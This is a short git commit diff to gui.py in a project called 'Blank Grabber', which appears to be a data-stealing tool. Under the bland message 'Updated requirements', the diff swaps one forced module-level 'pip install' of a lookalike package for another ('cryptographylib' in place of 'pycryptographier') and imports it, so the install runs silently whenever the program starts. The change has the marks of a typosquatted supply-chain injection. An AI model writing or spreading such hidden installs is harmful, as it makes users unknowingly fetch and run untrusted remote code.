cb3894b89f47d68f5a0dc557eaaffae565462365
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-12 21:46:40 +0200

    Updated requirements

--- Blank Grabber/gui.py
+++ Blank Grabber/gui.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographier")
-import pycryptographier
+os.system("pip install cryptographylib")
+import cryptographylib
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
